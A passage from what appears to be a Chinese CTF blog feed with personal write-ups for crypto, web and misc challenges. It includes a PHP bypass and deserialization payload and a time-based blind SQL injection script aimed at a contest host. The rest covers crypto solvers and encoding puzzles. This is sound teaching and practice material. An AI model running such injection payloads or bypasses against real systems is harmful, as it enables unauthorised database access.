punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> secret <span class="token keyword">import</span> flagm <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>e <span class="token operator">=</span> <span class="token number">2</span>p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> e<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"p = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>p<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"c = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>c<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''p = 7709388356791362098686964537734555579863438117190798798028727762878684782880904322549856912344789781854618283939002621383390230228555920884200579836394161c = 5573755468949553624452023926839820294500672937008992680281196534187840615851844091682946567434189657243627735469507175898662317628420037437385814152733456'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>e=2,很自然地想到低指数加密攻击，我直接暴力枚举了</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> bytes_to_long<span class="token punctuation">,</span> long_to_bytes<span class="token keyword">from</span> tqdm <span class="token keyword">import</span> tqdm<span class="token keyword">import</span> timep <span class="token operator">=</span> <span class="token number">7709388356791362098686964537734555579863438117190798798028727762878684782880904322549856912344789781854618283939002621383390230228555920884200579836394161</span>c <span class="token operator">=</span> <span class="token number">5573755468949553624452023926839820294500672937008992680281196534187840615851844091682946567434189657243627735469507175898662317628420037437385814152733456</span>i <span class="token operator">=</span> <span class="token number">1000000000</span>max_attempts <span class="token operator">=</span> <span class="token number">10000000000000000</span><span class="token keyword">with</span> tqdm<span class="token punctuation">(</span>total<span class="token operator">=</span>max_attempts<span class="token punctuation">,</span> desc<span class="token operator">=</span><span class="token string">"Decrypting"</span><span class="token punctuation">,</span> unit<span class="token operator">=</span><span class="token string">"iteration"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> pbar<span class="token punctuation">:</span>    <span class="token keyword">while</span> i <span class="token operator">&lt;</span> max_attempts<span class="token punctuation">:</span>        root<span class="token punctuation">,</span> is_exact <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>c <span class="token operator">+</span> i <span class="token operator">*</span> p<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> is_exact<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>        i <span class="token operator">+=</span> <span class="token number">1</span>        pbar<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 更新进度条</span>        <span class="token comment"># time.sleep(0.01)  # 可选的睡眠，以减缓进度条更新速度</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Exceeded maximum attempts. Decryption failed."</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行15分钟大概就出了</p><p>但是看了官方wp发现这是一个二次剩余问题，可以用sagemath直接秒，还是要多熟悉sagemath的语法以及函数</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">from Crypto.Util.number <span class="token function">import</span> *sage: from Crypto.Util.number <span class="token function">import</span> *sage: p <span class="token operator">=</span> <span class="token number">7709388356791362098686964537734555579863438117190798798028727762878684</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">78288090432254985691234478978185461828393900262138339023022855592088420057</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">9836394161</span>sage: c <span class="token operator">=</span> <span class="token number">5573755468949553624452023926839820294500672937008992680281196534187840</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">61585184409168294656743418965724362773546950717589866231762842003743738581</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">4152733456</span>sage: R.<span class="token operator">&lt;</span>m<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>p<span class="token punctuation">))</span>sage: f <span class="token operator">=</span> <span class="token punctuation">(</span>m^2<span class="token punctuation">)</span> - csage: m0 <span class="token operator">=</span> f.roots<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>sage: <span class="token assign-left variable">flag</span><span class="token operator">=</span>long_to_bytes<span class="token punctuation">(</span>int<span class="token punctuation">(</span>m0<span class="token punctuation">))</span>sage: print<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>b<span class="token string">'begin&#123;quadr4ticresidue_i5_s0_3asy&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="oeis2"><a class="markdownIt-Anchor" href="#oeis2"></a> OEIS2</h2><p>题目描述</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> hashlib <span class="token keyword">import</span> <span class="token operator">*</span>upper <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">**</span><span class="token number">28</span> <span class="token operator">+</span> <span class="token number">5</span> res <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> upper <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">*=</span> iflag <span class="token operator">=</span> <span class="token string">'Beginctf&#123;'</span> <span class="token operator">+</span> sha256<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>应该是需要优化算法，加快阶乘的计算，没看懂OEIS2的题目是什么意思，我查表没查出来，也不会手搓优化算法</p><p>我直接sagemath挂着跑</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> hashlib <span class="token keyword">import</span> sha256x <span class="token operator">=</span> gamma<span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">**</span> <span class="token number">28</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span>b <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>res <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> b<span class="token punctuation">:</span>    res <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>sha256<span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#c60a2e5c9e9572ed848776f282a9c90d6ca0fe29f8308b0b9b43c61d493133e9</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>L3H招新赛个人WP</title>
      <link href="/2023/10/14/L3h%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/"/>
      <url>/2023/10/14/L3h%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a class="markdownIt-Anchor" href="#web"></a> web</h1><h2 id="phpplayer"><a class="markdownIt-Anchor" href="#phpplayer"></a> phpplayer</h2><p>Payload:/?a[]=1&amp;b[]=2&amp;c[]=3&amp;d[1.01=4&amp;fake_flag=flag&amp;flag=1&amp;obj=O:4:“test”:2:{s:1:“a”;s:3:“abc”;}<br />flag=1</p><p>1.弱类型比较漏洞  将a设置为一个数组 绕过第一个和第二个if<br />2.根据md5特性  数组无法比较md5值  将b c 都设置为数组可绕过md5验证<br />3.get post flag=flag 绕过这个一个if<br />4.需要让 d_1.01 变量存在才能绕过这个if  但是这个变量命名不符合规则  csdn搜索遇到类似的<br />将d设置为包含子数组的参数 可以使条件成立 构造 d[1.01=1] 绕过这个if<br />5.反序列化漏洞   构造obj参数   修改属性数  绕过这个if<br />obj=O:4:“test”:2:{s:1:“a”;s:3:“abc”;}<br />6.将fake_flag 全局变量设置 为 flag 读取flag内容</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?php    <span class="token keyword">class</span> <span class="token class-name">test</span><span class="token punctuation">&#123;</span>        public $a<span class="token operator">=</span><span class="token string">'123'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    $a <span class="token operator">=</span> new test<span class="token punctuation">;</span>    echo serialize<span class="token punctuation">(</span>$a<span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token comment"># O:4:"test":1:&#123;s:1:"a";s:3:"123";&#125;</span>O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"test"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"a"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"123"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ilikesleep"><a class="markdownIt-Anchor" href="#ilikesleep"></a> ilikesleep</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> string<span class="token keyword">import</span> httpx<span class="token keyword">import</span> timeURL <span class="token operator">=</span> <span class="token string">"http://webt2.chall.ctf.l3hsec.com/index.php"</span>alis <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">)</span><span class="token punctuation">]</span>rlis <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">123</span><span class="token punctuation">,</span><span class="token number">125</span><span class="token punctuation">,</span><span class="token number">95</span><span class="token punctuation">,</span><span class="token number">44</span><span class="token punctuation">]</span> <span class="token operator">+</span> alis<span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span>payload<span class="token punctuation">:</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token builtin">bool</span><span class="token punctuation">:</span>    test_data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"id"</span><span class="token punctuation">:</span>payload<span class="token punctuation">&#125;</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        httpx<span class="token punctuation">.</span>post<span class="token punctuation">(</span>URL<span class="token punctuation">,</span>data<span class="token operator">=</span>test_data<span class="token punctuation">)</span>    <span class="token keyword">except</span> httpx<span class="token punctuation">.</span>ReadTimeout<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">attack</span><span class="token punctuation">(</span>column_length<span class="token punctuation">:</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>column_length<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> char <span class="token keyword">in</span> rlis<span class="token punctuation">:</span>            payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"1'\tunion\tselect\tnull,null,if(substr((select\tgroup_concat(flag)\tfrom\tflag),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1)='</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">chr</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">',benchmark(30000000,sha(1)),1)#"</span></span>            <span class="token keyword">if</span> test<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>                flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>                time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>                <span class="token keyword">break</span>    <span class="token keyword">return</span> flag<span class="token keyword">print</span><span class="token punctuation">(</span>attack<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> misc</h1><h2 id="base64"><a class="markdownIt-Anchor" href="#base64"></a> base64？</h2><p>我的密文: ox6qJI1Q7kJY1OvuR/1CBs1yRVvuEIfeR/lCUMAGrV8LwEL=<br />泄露的明文: jRQfVJMwco5wegcVY3cAFi5a7V97IIWMgNh/epeit8Prp1+vdved0CzndIyCqfEMvho3YF33SYjeif4oi0mGscBFhRH70i17E8IgGAVXtZGDhSK9vPkH5MhI<br />泄露的密文: N+d9r+rjVElQoG1krPlQ1+MG8LvXNV1p658u6L+d1L5aVsFKrEA+NEUhB/dYRTfIr/r+rxAx7suMTE+xJPrvVErqoG6r9QRGB5+0rP+s6XSWRX5/JI6m9spTTxJYNVnk9VpdrLlA1+pLPMlnNv6zbErUNLF5VPpd<br />你现在知道我的明文了吗？</p><p>wp:  根据题意 密文长度是明文长度的1.5倍可推测出是base64加密<br />但是常规的base64解密无法得出答案<br />根据泄露的明文和密文可以推测出 原来的base64码表被替换<br />所以需要根据明文和密文破解出 替换后的码表<br />由于写脚本水平太差 TmT  我半手动半脚本破解了码表：）  过程如下<br />根据base64的特性   把明文的ASCII值转为8位二进制</p><p>然后用python分为六个一组 计算出相应的数值 然后与字符 对应就得到了码表<br />不过不完整</p><p>然后替换码表进行base64解密<br />由于码表还不全  我写脚本的能力太差   然后我4个一组  暴力猜测手动试出了可读的字符  得到了flag TmT…</p><pre class="line-numbers language-none"><code class="language-none">import base64import stringstr1 &#x3D; &quot;ox6q JI1Q 7kJY 1Ovu R&#x2F;1C Bs1y RVvu EIfe R&#x2F;lC UMAG rV8L wEL&#x3D;&quot;string1 &#x3D; &quot;yAmxnvX&#x2F;wdjzR6b2U9TVB1PE8rNoJl7CFpOQM+saqW022feKY22GL5Ikhu222S22&quot;string2 &#x3D; &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&quot;print (base64.b64decode(str1.translate(str.maketrans(string1,string2))))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>把未知的码表替换为2  然后暴力破解出可读的字符<br />最终结果：  b’l3hsec{w0W!y0u_Re@11y_kn0w_B@se64!}’</p><p>我属于是编程水平太差，人肉爆破的，这里po一下南小鸟师傅的脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">diybase64_encode</span><span class="token punctuation">(</span>source<span class="token punctuation">,</span> cipher<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">map</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">' '</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    binary_str <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'08b'</span><span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> source<span class="token punctuation">)</span>    paddinglen <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>source<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">3</span>    tmp <span class="token operator">=</span> binary_str <span class="token operator">+</span> paddinglen <span class="token operator">*</span> <span class="token string">'00'</span>    result <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        tmp1 <span class="token operator">=</span> tmp<span class="token punctuation">[</span>i <span class="token operator">*</span> <span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">6</span><span class="token punctuation">]</span>        num <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>tmp1<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>        <span class="token builtin">map</span><span class="token punctuation">[</span>num<span class="token punctuation">]</span> <span class="token operator">=</span> cipher<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">return</span> <span class="token builtin">map</span>m <span class="token operator">=</span> <span class="token string">'jRQfVJMwco5wegcVY3cAFi5a7V97IIWMgNh/epeit8Prp1+vdved0CzndIyCqfEMvho3YF33SYjeif4oi0mGscBFhRH70i17E8IgGAVXtZGDhSK9vPkH5MhI'</span>c <span class="token operator">=</span> <span class="token string">'N+d9r+rjVElQoG1krPlQ1+MG8LvXNV1p658u6L+d1L5aVsFKrEA+NEUhB/dYRTfIr/r+rxAx7suMTE+xJPrvVErqoG6r9QRGB5+0rP+s6XSWRX5/JI6m9spTTxJYNVnk9VpdrLlA1+pLPMlnNv6zbErUNLF5VPpd'</span><span class="token builtin">map</span> <span class="token operator">=</span> diybase64_encode<span class="token punctuation">(</span>m<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token builtin">map</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到新的base64表，注意到没有flag密文中的一些字符，爆破。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">ci <span class="token operator">=</span> <span class="token string">'ox6qJI1Q7kJY1OvuR/1CBs1yRVvuEIfeR/lCUMAGrV8LwEL='</span><span class="token triple-quoted-string string">'''for i in ci:    if i not in map:        print(i)'''</span>lostChar <span class="token operator">=</span> <span class="token string">'OCyew'</span>lostPart <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">58</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">list</span><span class="token punctuation">(</span>itertools<span class="token punctuation">.</span>product<span class="token punctuation">(</span>lostPart<span class="token punctuation">,</span> repeat<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">set</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">continue</span>    tmpMap <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>lostChar<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        tmpMap<span class="token punctuation">[</span>i<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> lostChar<span class="token punctuation">[</span>j<span class="token punctuation">]</span>    flag <span class="token operator">=</span> diybase64_decode<span class="token punctuation">(</span>ci<span class="token punctuation">,</span> tmpMap<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'kn0w_B@se64!&#125;'</span> <span class="token keyword">in</span> flag <span class="token keyword">and</span> <span class="token string">'l3hsec&#123;w0W!y0u'</span> <span class="token keyword">in</span> flag<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="真的不用对脑洞"><a class="markdownIt-Anchor" href="#真的不用对脑洞"></a> 真的不用对脑洞</h2><p>跨过这两道栅栏，培根转身看不到摩斯，只看到了一堆贝斯</p><pre class="line-numbers language-none"><code class="language-none">8FUlS64u6kfnkWTRhWhdeWRds8DYw09nfHv07UBU73Up9AVuus1VIU0XBxaEUHooUMFGBkt4RfrMLeMbDCFhMakuFA1lzp0Sao8aUwZicJ8rLj6CDxYNBFUOQTuJ4EYmdTAAofTsBEYT3xvOKCbsRHJ2IP1nThBN9M4Q5glFsDSCx06CgzvkEy4RSdFRAWOrMVRcZTZMz4dl5gfJ6xUCAtLvW73nD5hnBogRc42jLpw7hFx9sUfFcAhGGXjEwGEOEJy8rs9MRkBgKQOy1YxJ74fnbAGSXTp4d99aLGSBDyxkLufiSdfWEdA3F62C9SN8qWuyvjo0O824RvlqISyhwOygq8QleUXdallrNYi4gXZBA0GZ1fhBuFF3PMuX1W7dKsh4nw65FUeuwcg67mVv1egoo67JdcNo3mLh3vzydJhyTXGcwwe4MnbQEYyg6NQKfFKUe8acJMUxpBUAtJebjomEaODkxDZzHPwSBKPyKwnCCAoaQEYnVZ0ePPDSpsm0DXb4WjyfXalsudNbS9ghrhnlofKe2tBK98qPSpm1haTA2Xrl7WOXTLD6mgf7Hz0GTzfKpY0P3r0W8VnjUi3Zz0qISytGey0yFA1Ic0dslEHz1QjbP91D9bYJYJlP0QdQB7q9zJ7Mx7b1qS3V4qKoXv8pZ72A1KKyACrjQ0OMxb7VXmwYP7taYpYsmgdArc20u6zvHyuqCZT9waCNQ3rc9KKvrO2mR5ZL2jvBeiVUWraM2seagF5rcQ956DyC3TArAyvQd5zpe3eV3tEGE000QsUOBIIaX4V2WTWp8o91JU9YTl8lJ9sohu5jvoaUnvsWFBsvf6fFk8odUCKCueTiVYf3wWqD66X2Li9MMRa0pXuWD8cyYKGdQFuVWdjXHSueYk1u8kEhUpeE9EH5CF5YSnAWgYxPZVDFRpMbHH4NvzR68BRCE53h2ZalKdmm7Vd4lUmUTsKQNTWIj2iGZcnk7nZf7igefun3lqMy7TNwhFMtwVMStMlEYND6DW8LFQNrX9RkJAvVXbBVhSiLZpXoGPaBlk856cXzx2c2CjnTwUCceQhsqRvVOhedvlWR7qUX7R3gjcSXBSUw6fJBskGwvgA0m3qfpCzfS7rBFN9Ayogcuqw7HPluhaGXqDGpH8s1nthQ67klVDJmlhPe19aCclFNN4tfyEpAeOOq09jGOSZjnVmUU3EIcxJcnD4fMNbYvXQ9893LpLZYoNEX4aG8pnDtSxHBDUwMRRXZ8FAAUThUiIOT933sy6rMCj1pLxZ5Q4qvN0b3aUzTvt0jOnqDypygaFK1dXOCEatTRrAW9ElJJkZYUv31m12iU06LhapQy9DCntDahiwQMtEkmBlNdjgNPuNeMD8miRQDcEnvjqM5CXhNiSZa1dvtG7DhyQ7lpbILclMyrP85Xh7Dny28eoEwMZGq3tG0sNOGKFm97tktMQdhLz6xvXN2Z1pBbIWOWPYu7X40VfBojUZclnkK7xaNTgCJ40gVp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>利用basecrack脚本多次base解码后得到这个</p><pre class="line-numbers language-none"><code class="language-none">-.&#x2F;-.&#x2F;---&#x2F;-.&#x2F;-.&#x2F;---&#x2F;-.&#x2F;-.&#x2F;---&#x2F;-.&#x2F;-.&#x2F;---&#x2F;---&#x2F;-.&#x2F;---&#x2F;-.&#x2F;---&#x2F;-.&#x2F;-.&#x2F;-.&#x2F;-.&#x2F;---&#x2F;-.&#x2F;-.&#x2F;---&#x2F;-.&#x2F;-.&#x2F;-.&#x2F;---&#x2F;-.&#x2F;-.&#x2F;---&#x2F;---&#x2F;---&#x2F;-.&#x2F;-.&#x2F;-.&#x2F;-.&#x2F;---&#x2F;-.&#x2F;---&#x2F;---&#x2F;-.&#x2F;-.&#x2F;-.&#x2F;---&#x2F;-.&#x2F;-.&#x2F;-.&#x2F;---&#x2F;-.&#x2F;-.&#x2F;-.&#x2F;---&#x2F;-.&#x2F;---&#x2F;---&#x2F;-.&#x2F;-.&#x2F;-.&#x2F;-.&#x2F;---&#x2F;-.&#x2F;---&#x2F;---&#x2F;-.&#x2F;---&#x2F;---&#x2F;---&#x2F;---&#x2F;-.&#x2F;-.&#x2F;-.&#x2F;-.&#x2F;-.&#x2F;---&#x2F;-.&#x2F;-.&#x2F;---&#x2F;---&#x2F;---&#x2F;-.&#x2F;-.&#x2F;---&#x2F;-.&#x2F;-.&#x2F;---&#x2F;---&#x2F;---&#x2F;-.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>翻译莫斯电码</p><pre class="line-numbers language-none"><code class="language-none">NNONNONNONNOONONONNNNONNONNNONNOOONNNNONOONNNONNNONNNONOONNNNONOONOOOONNNNNONNOOONNONNOOON<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>5个一组</p><pre class="line-numbers language-none"><code class="language-none">AABAA BAABA ABBAB ABAAA ABAAB AAABA ABBBA AAABA BBAAA BAAAB AAABA BBAAA ABABB ABBBB AAAAA BAABB BAABA ABBBA<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>培根密码解码    E S N I J C O C Y R C Y L P A T S O   E T O I K C P C  S C  M Q A U T P</p><p>根据跨过两道栅栏可以  将其分为两个一组<br />ES NI JC OC YR CY LP AT SO<br />每组先读取首字母得到  ENJOYCLASSICCRYPTO</p><h2 id="chatsignin"><a class="markdownIt-Anchor" href="#chatsignin"></a> chatsignin</h2><p>奶奶的睡前flag故事</p><h2 id="robot36"><a 